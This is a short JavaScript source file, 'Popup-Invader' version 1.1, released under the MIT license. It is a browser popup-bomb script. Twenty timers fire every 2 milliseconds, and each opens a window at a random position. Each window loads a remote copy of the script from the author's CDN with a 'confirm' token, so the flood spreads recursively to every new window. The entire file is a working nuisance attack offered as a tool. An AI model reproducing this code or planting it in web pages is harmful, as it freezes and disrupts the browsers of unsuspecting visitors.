/* MIT License

Copyright (c) 2019 Renaud, Fire-Softwares

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
*/

/**************************************************************************
 *           .______     ______   .______    __    __  .______            *
 *          |   _  \   /  __  \  |   _  \  |  |  |  | |   _  \            *
 *          |  |_)  | |  |  |  | |  |_)  | |  |  |  | |  |_)  |           *
 *          |   ___/  |  |  |  | |   ___/  |  |  |  | |   ___/            *
 *          |  |      |  `--'  | |  |      |  `--'  | |  |                *
 *          | _|       \______/  | _|       \______/  | _|                *
 *                                                                        *
 *  __  .__   __. ____    ____  ___       _______   _______ .______       *
 * |  | |  \ |  | \   \  /   / /   \     |       \ |   ____||   _  \      *
 * |  | |   \|  |  \   \/   / /  ^  \    |  .--.  ||  |__   |  |_)  |     *
 * |  | |  . `  |   \      / /  /_\  \   |  |  |  ||   __|  |      /      *
 * |  | |  |\   |    \    / /  _____  \  |  '--'  ||  |____ |  |\  \----. *
 * |__| |__| \__|     \__/ /__/     \__\ |_______/ |_______|| _| `._____| *
 *                                                                        *
 ***  ***  ***  ***  ***  ***  ***  ****  ***  ***  ***  ***  ***  ***  ***
 *                             Version : 1.1                              *
 *                 Author : Renaud42 from fire-Softwares                  *
 *************************************************************************/

// Redundant version

/**************************
*         SETTINGS        *
**************************/
var website = "https://cdn.fire-softwares.ga/popup-invader/?confirm=yes";       // Setting the link of the popup to the website who executes the code of Popup-Invader with confirm token to make the script execute recursively
var title   = "_blank";                                                         // Title of the pop-up
var text   = "Recursion(Recursion(Recursion(...)))";                            // Text sent in the console
var size    = [200, 200];                                                       // Size of pop-ups (format : [width, height])
var delay   = 2;                                                                // Delay (in milliseconds) between each pop-up
var threads = 20;                                                               // Number of threads

/**************************
*        MAIN CODE        *
**************************/
for (var i = 0; i < threads; i++)   // Repeat *threads* times
  setInterval(function() {          // Make script run each *delay* milliseconds
      var v = window.open(website, title, "height=" + size[1]                                       // Setting pop-up height to size[1]
                                + ",width=" + size[0]                                               // Setting pop-up width to size[0]
                                + ",top=" + Math.floor(Math.random() * (screen.height - size[1]))   // Setting window y to a random location in the interval [0 ; clientHeight - popupHeight]
                                + ",left=" + Math.floor(Math.random() * (screen.width - size[0]))); // Setting window x to a random location in the interval [0 ; clientWidth - popupWidth]
      console.log(text);
  }, delay, delay);
